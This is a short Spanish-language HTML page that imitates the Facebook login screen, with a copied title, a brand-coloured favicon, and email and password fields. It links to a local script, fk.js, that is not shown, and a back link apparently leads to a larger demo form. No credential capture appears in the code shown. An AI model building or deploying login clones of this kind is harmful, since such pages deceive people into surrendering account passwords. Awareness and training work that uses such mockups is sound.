<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Iniciar sesión en Facebook</title>
    <link rel="stylesheet" href="fk.css">
    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22 fill=%22%231877F2%22 font-family=%22Arial%22 font-weight=%22bold%22>f</text></svg>">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
    <a href="../../form.html" class="back-arrow-link" aria-label="Volver al formulario principal">&lt;</a>

    <div class="login-page">
        <div class="header">
            <h1>facebook</h1>
        </div>
        <div class="login-box">
            <h2>Iniciar sesión en Facebook</h2>
            <form id="loginForm">
                <input type="text" placeholder="Correo electrónico o número de teléfono" required>
                <input type="password" placeholder="Contraseña" required>
                <button type="submit" class="login-btn">Iniciar sesión</button>
            </form>
            <a href="#" class="forgot-link">¿Olvidaste tu cuenta?</a>
            <div class="divider"></div>
            <button class="create-btn">Crear cuenta nueva</button>
        </div>
    </div>
    <script src="fk.js"></script>
</body>
</html>
